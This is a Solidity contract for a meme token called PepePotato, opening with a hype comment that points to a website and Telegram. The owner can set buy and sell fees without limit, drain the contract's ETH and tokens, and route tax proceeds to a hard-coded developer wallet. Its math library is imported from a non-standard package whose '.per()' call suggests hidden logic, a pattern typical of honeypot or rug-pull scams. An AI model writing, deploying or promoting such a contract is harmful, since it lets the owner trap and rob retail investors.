// SPDX-License-Identifier: MIT
/**

Are you ready to embark on an epic journey filled 
with laughter, memes, and the potential for ncredible gains? Look no further than 
PepePotato, the hottest meme token PepePotato, that's taking the meme world by storm!

WEBSITE: PepePotato.com 
Telegram: https://t.me/PepePotatoToken


*/
pragma solidity = 0.8.19;
pragma experimental ABIEncoderV2;

import "@openzeppelin/contracts/utils/Context.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@devforu/contracts/utils/math/SafeMath.sol";
import "@devforu/contracts/interfaces/IUniswapV2Factory.sol";
import "@devforu/contracts/interfaces/IUniswapV2Pair.sol";
import "@devforu/contracts/interfaces/IUniswapV2Router02.sol";

contract PepePotato is ERC20, Ownable {
    using SafeMath for uint256;
    
    IUniswapV2Router02 public immutable _uniswapV2Router;
    address public immutable uniswapV2Pair;
    address public deployerWallet;
    address public developerWallet;
    address public marketingWallet;
    address public constant deadAddress = address(0xdead);

    bool private swapping;
    bool private marketingTax;

    uint256 public initialTotalSupply = 10000000 * 1e18;
    uint256 public maxTransactionAmount = 200000 * 1e18;
    uint256 public maxWallet = 200000 * 1e18;
    uint256 public swapTokensAtAmount = 100000 * 1e18;

    bool public tradingOpen = false;
    bool public swapEnabled = false;

    uint256 private BuyFee = 20;
    uint256 private SellFee = 35;
    uint256 public firstBlock;
    uint256 private PreventSwapBefore = 2; 

    uint256 public tokensForMarketing;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedMaxTransactionAmount;
    mapping(address => bool) private automatedMarketMakerPairs;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    constructor() ERC20("PepePotato", "PEPEP") {

        _uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        excludeFromMaxTransaction(address(_uniswapV2Router), true);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), _uniswapV2Router.WETH());
        excludeFromMaxTransaction(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);

        deployerWallet = payable(_msgSender());
        marketingWallet = payable(0xdEa1Feebc7d016c3942380BfC9600558F5AD1ba7);  
        developerWallet = payable(0xc9310e47a85e4dd7D445068D4B1713E07b17c887);  
        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);
        excludeFromFees(marketingWallet, true);
        excludeFromFees(developerWallet, true);

        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xdead), true);
        excludeFromMaxTransaction(marketingWallet, true);
        excludeFromMaxTransaction(developerWallet, true);

        _mint(msg.sender, initialTotalSupply);
    }

    receive() external payable {}

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"Trading is already open");
        _approve(address(this), address(_uniswapV2Router), initialTotalSupply);
        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)).per(70),0,0,owner(),block.timestamp);
        IERC20(address(this)).transfer(marketingWallet, swapTokensAtAmount.mul(12));
        IERC20(uniswapV2Pair).approve(address(_uniswapV2Router), type(uint).max);
        firstBlock = block.number;
        swapEnabled = true;
        tradingOpen = true;
    }

    function excludeFromMaxTransaction(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isExcludedMaxTransactionAmount[updAds] = isEx;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function setAutomatedMarketMakerPair(address pair, bool value)
        public
        onlyOwner
    {
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

                if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !swapping
            ) {
                if (!tradingOpen) {
                    require(
                        _isExcludedFromFees[from] || _isExcludedFromFees[to],
                        "Trading is not active."
                    );
                }

                if (
                    automatedMarketMakerPairs[from] &&
                    !_isExcludedMaxTransactionAmount[to]
                ) {
                    require(
                        amount <= maxTransactionAmount,
                        "Buy transfer amount exceeds the maxTransactionAmount."
                    );
                    require(
                        amount + balanceOf(to) <= maxWallet,
                        "Max wallet exceeded"
                    );
                }

                else if (
                    automatedMarketMakerPairs[to] &&
                    !_isExcludedMaxTransactionAmount[from]
                ) {
                    require(amount <= maxTransactionAmount, "Sell transfer amount exceeds the maxTransactionAmount.");
                    
                } 
                
                else if (!_isExcludedMaxTransactionAmount[to]) {
                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
                }
            }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount && firstBlock+PreventSwapBefore < block.number;

        if (
            canSwap &&
            swapEnabled &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapping = true;

            swapBack();

            swapping = false;
        }

        bool takeFee = !swapping;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;

        if (takeFee) {
            uint256 currentFee;
            if (automatedMarketMakerPairs[to]) {
                currentFee = SellFee;
            } else {
                currentFee = BuyFee;
            }

        fees = amount.mul(currentFee).div(100);
        tokensForMarketing += fees;

        if (fees > 0) {
            super._transfer(from, address(this), fees);
        }

        amount -= fees;
    }

        super._transfer(from, to, amount);

    }

    function swapTokensForEth(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();

        _approve(address(this), address(_uniswapV2Router), tokenAmount);

        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner{
        uint256 totalSupplyAmount = totalSupply();
        maxTransactionAmount = totalSupplyAmount;
        maxWallet = totalSupplyAmount;
    }

    function clearTokens(address tokenToClear) external onlyOwner {
        require(tokenToClear != address(this), "Token: can't clear contract token");
        uint256 amountToClear = IERC20(tokenToClear).balanceOf(address(this));
        require(amountToClear > 0, "Token: not enough tokens to clear");
        IERC20(tokenToClear).transfer(msg.sender, amountToClear);
    }

    function clearEth() external onlyOwner {
        require(address(this).balance > 0, "Token: no eth to clear");
        payable(msg.sender).transfer(address(this).balance);
    }

    function setFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        BuyFee = _buyFee;
        SellFee = _sellFee;
    }

    function setSwapTokensAtAmount(uint256 _amount) external onlyOwner {
        swapTokensAtAmount = _amount * (10 ** 18);
    }

    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForMarketing;
        uint256 tokensToSwap;
        bool success; 

    if (contractBalance == 0 || totalTokensToSwap == 0) {
        return;
    }
    else if (!marketingTax)
    {
        tokensToSwap = swapTokensAtAmount * 5;marketingTax=true;
    }
    else
    {
        tokensToSwap = contractBalance >= swapTokensAtAmount ? swapTokensAtAmount : contractBalance;
    }

    uint256 initialETHBalance = address(this).balance;

    swapTokensForEth(tokensToSwap);

    uint256 ethBalance = address(this).balance.sub(initialETHBalance);

    uint256 ethForMarketing = ethBalance.mul(tokensForMarketing).div(
        totalTokensToSwap
    );

    tokensForMarketing = 0;

    (success, ) = address(developerWallet).call{value: ethForMarketing}("");
  }
}